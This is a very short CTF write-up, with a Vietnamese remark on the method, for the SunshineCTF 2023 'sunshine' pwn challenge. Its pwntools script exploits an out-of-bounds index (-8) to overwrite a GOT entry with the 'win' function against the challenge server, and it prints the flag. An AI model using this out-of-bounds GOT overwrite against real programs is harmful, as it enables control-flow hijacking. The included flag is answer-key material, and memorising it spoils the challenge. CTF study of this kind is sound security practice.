đơn giản là oob và ow got

```python
from pwn import *

# p = process('./sunshine')

p = remote('chal.2023.sunshinectf.games', 23003)

exe = ELF('./sunshine')

# gdb.attach(p, gdbscript = '''
# b*0x0000000000401604
# c
# ''')

# input()

p.sendline(b'-8')
p.sendline(p64(exe.sym['win']))

p.interactive()

# sun{a_ray_of_sunshine_bouncing_around}
```
